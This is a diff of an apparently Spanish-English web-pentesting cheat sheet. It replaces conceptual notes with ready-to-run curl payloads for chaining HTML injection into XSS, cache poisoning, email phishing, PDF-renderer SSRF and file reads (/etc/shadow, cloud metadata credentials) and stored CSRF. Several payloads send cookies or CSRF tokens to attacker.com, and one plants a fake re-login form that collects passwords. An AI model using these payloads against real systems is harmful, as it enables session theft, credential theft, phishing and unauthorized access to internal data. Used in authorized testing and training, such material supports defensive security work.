@@ -27,21 +27,21 @@ linked:
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concept | If filter blocks `<script>` but allows `<img>`, atacante busca event handlers en allowed tags | Privesc HTML to XSS. |
-| Image onerror | `<img src=x onerror=alert(1)>` | If onerror not filtered. |
-| Image onload | `<img src=valid onload=alert(1)>` | Triggered on successful load. |
-| SVG onload | `<svg onload=alert(1)>` | SVG often allowed but events triggered. |
-| Body onload | `<body onload=alert(1)>` | Less common but possible. |
-| Iframe srcdoc | `<iframe srcdoc="<script>alert(1)</script>">` | Different context. |
-| Object data | `<object data="javascript:alert(1)">` | Edge. |
-| Embed src | `<embed src="javascript:alert(1)">` | Same. |
-| Form formaction | `<form><button formaction="javascript:alert(1)">x</button></form>` | Button-based. |
-| Math element | `<math><mtext>...<a href="javascript:alert(1)">x</a></mtext></math>` | Lesser known. |
-| Animate element | `<svg><animate attributeName=href values=javascript:alert(1)>` | Animation events. |
-| Combine con CSP bypass | If `unsafe-inline` allowed, inline events execute | CSP-aware. |
-| `nonce` reuse abuse | If nonce predictable o leakeable | CSP nonce bypass. |
-| `eval()` reachable via `unsafe-eval` | Combine | CSP. |
-| Stored XSS via stored HTML | Stored injection persistente | High impact. |
+| `curl 'https://target/?q=<img src=x onerror=alert(document.domain)>'` | Image onerror event XSS | Filter allows `<img>`. |
+| `curl 'https://target/?q=<img src=//attacker.com/log onload=fetch("//attacker.com/?c="+document.cookie)>'` | Image onload triggers on success | Image triggered. |
+| `curl 'https://target/?q=<svg onload=alert(1)>'` | SVG onload XSS | SVG whitelisted. |
+| `curl 'https://target/?q=<svg><script>alert(1)</script></svg>'` | SVG embedded script | SVG context bypass. |
+| `curl 'https://target/?q=<body onload=alert(1)>'` | Body onload | Body context. |
+| `curl 'https://target/?q=<iframe srcdoc="<script>alert(1)</script>"></iframe>'` | Iframe srcdoc different parsing context | Filter context. |
+| `curl 'https://target/?q=<object data="javascript:alert(1)"></object>'` | Object javascript: scheme | Legacy. |
+| `curl 'https://target/?q=<form><button formaction="javascript:alert(1)">x</button></form>'` | Button formaction javascript: | HTML5 formaction. |
+| `curl 'https://target/?q=<details ontoggle=alert(1) open>x</details>'` | Details ontoggle | HTML5 event. |
+| `curl 'https://target/?q=<input onfocus=alert(1) autofocus>'` | Auto-focus event | Auto-trigger. |
+| `curl 'https://target/?q=<select onfocus=alert(1) autofocus>'` | Same con select | Auto-trigger. |
+| `curl 'https://target/?q=<video><source onerror=alert(1)></video>'` | Video source onerror | HTML5 video. |
+| `curl 'https://target/?q=<math><mtext><a href="javascript:alert(1)">x</a></mtext></math>'` | MathML XSS edge | MathML rare. |
+| `curl 'https://target/?q=<svg><animate attributeName=href values=javascript:alert(1)></svg>'` | SVG animate href to javascript: | SVG SMIL. |
+| `curl 'https://target/?q=<style>@import url("https://attacker.com/x.css")</style>'` (sin script-src CSP) | CSS @import chain | CSP gap. |
 ^htmli-chain-xss
 
 ___
@@ -50,16 +50,17 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concept | HTML injection en field unkeyed (header reflejado) → cached response → todos los users see injection | Mass impact. |
-| Reflected via `X-Forwarded-Host` | App reflects header value en `<base href>` o canonical | Atacante poisons. |
-| Reflected via Cookie | Cookie reflected en page → cache poison via Set-Cookie | Edge. |
-| Combine con Param Miner | Discover unkeyed input → inject HTML | Standard workflow. |
-| Stored-effect via cache TTL | Even sin DB store, persiste por TTL del cache | Persistencia. |
-| Mass phishing via cache | Cache poisoned con fake login form | High impact. |
-| CDN-level cache | Cloudflare / Akamai cache poisoned | Wide reach. |
-| Multi-tier cache | Origin caches → CDN caches → all users served poisoned | Cascading. |
-| Combine con HRS | Smuggle response que cachea con HTML inject | Chain. |
-| Time-window cache poison | Atacante times poisoning con high-traffic moments | Maximum impact. |
+| `curl -H "X-Forwarded-Host: attacker.com<script>alert(1)</script>" https://target/ \| grep "attacker.com<script>"` | XFH reflection HTML inject cache poison | Unkeyed header reflected. |
+| `curl -H "X-Forwarded-Host: attacker.com'><img src=x onerror=fetch('//attacker.com/?c='+document.cookie)>" https://target/?cb=1` | XFH break attribute + XSS | Attribute context. |
+| `curl -H "X-Forwarded-Scheme: javascript" -H "X-Forwarded-Host: alert(1)" https://target/?cb=2` | Scheme + host chain | Compound. |
+| `curl -X POST -d "search=<form action=//attacker.com><input name=p type=password><button>Re-login</button></form>" https://target/?cb=3 \| grep form` | Stored cache poison via search reflected | Cache + reflected. |
+| `python3 param-miner.py -u https://target/ -w params.txt` then poison discovered unkeyed param | Discover unkeyed input + poison | Standard workflow. |
+| `curl -H "X-Forwarded-Host: attacker.com<script>fetch(\`//attacker.com/?c=\${document.cookie}\`)</script>" https://target/?cb=4` | XFH script inject | Cookie steal cache. |
+| `for i in {1..100}; do curl -H "X-Forwarded-Host: x.com'><base href='//attacker.com/'>" "https://target/?cb=$i"; done` | Base href hijack cache poison loop | Asset hijack cache. |
+| `wcvs -u https://target/ -w params.txt` (Web Cache Vulnerability Scanner) | Auto WCVS scanner | Automated. |
+| `curl -H "Cache-Control: max-age=86400" -H "X-Forwarded-Host: ..." https://target/?cb=5` | Force long cache TTL post-poison | TTL extend. |
+| `for ts in {0..3600}; do sleep 1; curl -H "X-Forwarded-Host: attacker.com'><img src=x>" "https://target/news?cb=$(date +%s)"; done` | Sustained re-poison high-traffic moments | Maximum reach. |
+| `curl -H "X-Forwarded-Host: attacker.com" -H "Transfer-Encoding: chunked" --data-binary @smuggle.txt https://target/` (CL.TE smuggle + cache) | Smuggle response cache poison HTML inject | HRS combo. |
 ^htmli-chain-cache
 
 ___
@@ -68,19 +69,17 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concept | App sends emails con user input embedded en HTML body. No sanitization → email phishing. | Spear phishing vector. |
-| Welcome email | `<a href="https://attacker">Confirm</a>` en welcome email | Trust transfer. |
-| Password reset email | Replace reset link con attacker's | High impact ATO. |
-| Notification email | Insert phishing en routine notification | Stealth. |
-| Email subject HTML | Some clients render subject HTML | Edge. |
-| Email signature HTML | User signature reflected to recipients | Stored. |
-| Newsletter HTML | Mass-distributed | Wide reach. |
-| Tracking pixel | `<img src="//attacker/track">` en email | User tracking. |
-| Outlook conditional | `<!--[if mso]>` Outlook-only | Edge case targeting. |
-| Email client URL handlers | `mailto:`, `tel:`, custom scheme handlers | Mobile. |
-| Email-based MFA bypass | If email visible content includes auth code | Edge. |
-| HTML email phishing | Standard | Standard. |
-| Combine con SES / SendGrid | If service permits HTML | Common. |
+| `curl -X POST -d "name=<a href='//attacker.com'>Click here</a>&email=victim@target.com" https://target/register` | Welcome email phishing link inject | Welcome flow. |
+| `curl -X POST -d "email=victim@target.com" https://target/forgot` luego inspect email para HTML render | Reset email phishing link | Reset flow. |
+| `curl -X POST -d "signature=<a href='//attacker.com/scam'>Verified Seller</a>" https://target/profile` (signature en emails) | Stored signature en sent emails | Stored email. |
+| `curl -X POST -d "name=<img src='//attacker.com/track?u=victim'>" https://target/contact` | Tracking pixel via name field | Email tracking. |
+| `curl -X POST -d "subject=Update <!-- <script>alert(1)</script> -->&body=text" https://target/send` | HTML subject (some clients render) | Edge client. |
+| `curl -X POST -d 'comment=<!--[if mso]>This shows in Outlook only<![endif]-->' https://target/comments` | Outlook conditional comment targeting | Per-client target. |
+| `curl -X POST -d 'body=<a href="mailto:victim@target.com?subject=Reset&body=Code:%20$CODE">Click</a>' https://target/template` | mailto with pre-filled phishing | Phish-email. |
+| `curl -X POST -d 'body=<a href="tel:+1-555-PHISH">Call Support</a>' https://target/template` | tel: vishing email | Vishing combo. |
+| `curl -X POST -d 'body=<meta http-equiv="refresh" content="0;url=https://attacker.com">' https://target/newsletter` | Auto-refresh email | Some clients. |
+| `curl -X POST -d "name=<base href='//attacker.com/'>" https://target/register` (base href in email) | Email base href hijack assets | Asset hijack. |
+| `python3 swaks --to victim@target.com --from "attacker@attacker.com" --header "Subject: Update" --body @malicious.html` | Direct swaks test email send | Manual test. |
 ^htmli-chain-email
 
 ___
@@ -89,34 +88,29 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concept | App generates PDF / print view from user content via wkhtmltopdf, Chromium headless, etc. HTML inject → PDF render con malicious content. | Server-side render. |
-| File read via `<iframe>` | `<iframe src="file:///etc/passwd">` | wkhtmltopdf reads file system. |
-| File read via `<img>` | `<img src="file:///etc/passwd">` | Same. |
-| File read via `<link>` | `<link href="file:///...">` | CSS load. |
-| SSRF via `<iframe>` | `<iframe src="http://internal:8080">` | Internal access. |
-| SSRF via `<img>` | Same. | Standard. |
-| RCE en wkhtmltopdf vulnerable versions | CVE-specific | Per-version. |
-| JavaScript en PDF | `<script>...</script>` if engine renders JS | Headless Chromium. |
-| Load attacker's CSS/JS | External resources loaded server-side | Combine. |
-| Read internal pages | Atacante's HTML loads internal-only pages | Auth-context disclosure. |
-| Combine con SSRF + file read | Multi-stage | Standard. |
-| Print preview abuse | If app uses CSS `@media print { ... }` | Conditional render. |
-| Receipt / invoice generation | Common stack | E-commerce. |
+| `curl -X POST -d 'invoice_note=<iframe src="file:///etc/passwd" width="100%" height="500"></iframe>' https://target/invoice/generate` | wkhtmltopdf file:// read /etc/passwd | wkhtmltopdf backend. |
+| `curl -X POST -d 'report_data=<img src="file:///etc/shadow">' https://target/report/pdf` | Image-based file read | File read via img. |
+| `curl -X POST -d 'note=<link rel="stylesheet" href="file:///etc/passwd">' https://target/pdf` | CSS file read | CSS load file. |
+| `curl -X POST -d 'note=<iframe src="http://169.254.169.254/latest/meta-data/" width=600 height=400></iframe>' https://target/pdf` | SSRF AWS metadata via PDF render | AWS SSRF. |
+| `curl -X POST -d 'note=<iframe src="http://localhost:8080/admin" width=800 height=600></iframe>' https://target/pdf` | Internal SSRF | Internal network. |
+| `curl -X POST -d 'note=<iframe src="http://169.254.170.2/v2/credentials/$(curl http://169.254.170.2/v2/credentials/ -s)" ></iframe>' https://target/pdf` | ECS task credentials SSRF | ECS-context. |
+| `curl -X POST -d 'note=<script>fetch("http://internal/admin").then(r=>r.text()).then(t=>document.body.innerText=t)</script>' https://target/pdf` (Chromium-headless) | JS execution in Chromium PDF | Headless Chromium. |
+| `curl -X POST -d 'note=<link rel="stylesheet" href="https://attacker.com/style.css">' https://target/pdf` | External CSS load server-side | External resource. |
+| `curl -X POST -d 'note=<style>@media print { body::after { content: url("http://internal/secret"); } }</style>' https://target/pdf` | Print media query SSRF | Print-only. |
+| `nuclei -t exposures/configs/wkhtmltopdf-version.yaml -u https://target` | Identify wkhtmltopdf version pre-attack | Pre-attack version. |
+| `curl -X POST -d 'note=<object data="file:///etc/passwd"></object>' https://target/pdf` | Object tag file read | Object embed. |
+| `curl -X POST -d 'note=<embed src="file:///etc/passwd">' https://target/pdf` | Embed tag file read | Same. |
 ^htmli-chain-pdf
 
 ### PoC PDF SSRF + file read
 
 ```html
-<!-- Atacante envía como input -->
 <iframe src="file:///etc/passwd" width="100%" height="500"></iframe>
 <img src="file:///etc/shadow">
-<iframe src="http://169.254.169.254/latest/meta-data/" width="100%" height="500"></iframe>
-
-<!-- App genera PDF/print de la HTML con wkhtmltopdf
-     Engine carga file:// y http:// internal URLs
-     Resultados aparecen en el PDF generado
-     Atacante descarga PDF → ve files/internal data -->
+<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" width="100%" height="500"></iframe>
 ```
+
+Send to PDF generator endpoint. Engine loads `file://` and `http://` internal URLs. Resultados aparecen en PDF generado.
 
 ___
 
@@ -124,17 +118,16 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concept | HTML inject en authenticated context → form auto-submit con CSRF action | High impact ATO. |
-| Auto-submit form en stored injection | `<form id="x" action="legit/transfer"><input name="to" value="attacker"></form><script>document.getElementById('x').submit()</script>` | Direct CSRF. |
-| Image-based CSRF | `<img src="legit/api/delete?id=42">` | GET-based CSRF. |
-| iframe-based CSRF | `<iframe src="legit/admin/grant?user=attacker">` | iframe loads. |
-| Form submit simulation | `<form action="legit/critical-action"><button>Click</button></form>` | User-triggered. |
-| Stored form en profile | Persistent stored form en victim's view | Stored CSRF. |
-| Combine con SameSite=Lax | GET-based CSRF still works | Pattern. |
-| Combine con cookie disclosure | HTML inject leaks via Referer + CSRF | Multi-vector. |
-| Cross-origin same-site abuse | Subdomain HTML inject + cross-subdomain CSRF | Stack chain. |
-| Stored XSS-CSRF combo | XSS read CSRF token + perform action | Standard. |
-| HTML inject = XSS = CSRF | If escala a XSS → autonomous CSRF | Chain. |
+| `curl -X POST -d 'comment=<form id="x" action="https://target.com/transfer" method="POST"><input name="to" value="attacker"><input name="amount" value="10000"></form><script>document.getElementById("x").submit()</script>' https://target/comments` | Stored auto-submit form CSRF | XSS+CSRF chain. |
+| `curl -X POST -d 'comment=<img src="https://target.com/api/delete?id=42">' https://target/comments` | GET-based CSRF via image | GET endpoint vuln. |
+| `curl -X POST -d 'comment=<iframe src="https://target.com/admin/grant?user=attacker&role=admin" style="display:none"></iframe>' https://target/comments` | Iframe GET CSRF | GET admin action. |
+| `curl -X POST -d 'comment=<form action="https://target.com/critical-action" method="POST"><input name="x" value="y"><button>Click for Prize</button></form>' https://target/comments` | User-triggered form CSRF | User-click required. |
+| `curl -X POST -d 'profile=<form id="x" action="https://target.com/email/change" method="POST"><input name="email" value="attacker@evil.com"></form>' https://target/profile` (con XSS submit) | Stored profile-view CSRF email change | Stored on profile. |
+| `curl -X POST -d 'comment=<img src="https://target.com/api/csrf-token-display"><script>fetch("//attacker.com/?t="+document.body.innerText)</script>' https://target/comments` | CSRF token leak + reuse | Token leak chain. |
+| `curl -X POST -d 'comment=<form action="https://target.com/api/x" method="POST"><input name="_method" value="DELETE"><button>x</button></form>' https://target/comments` | Method-override DELETE CSRF | _method override. |
+| `curl -X POST -d 'comment=<iframe srcdoc="<form action=https://target.com/api/x method=POST id=f><input name=admin value=true></form><script>document.getElementById(\"f\").submit()</script>"></iframe>' https://target/comments` | srcdoc auto-CSRF | iframe context. |
+| `curl -X POST -d 'comment=<a href="https://target.com/transfer?to=attacker&amount=10000">Click to claim prize</a>' https://target/comments` | GET CSRF link disguise | Link disguise. |
+| `curl -X POST -d 'sig=<img src="https://target.com/api/refresh?action=extend">' https://target/profile` (stored signature) | Stored CSRF session-extension | Persistent CSRF. |
 ^htmli-chain-csrf
 
 ***
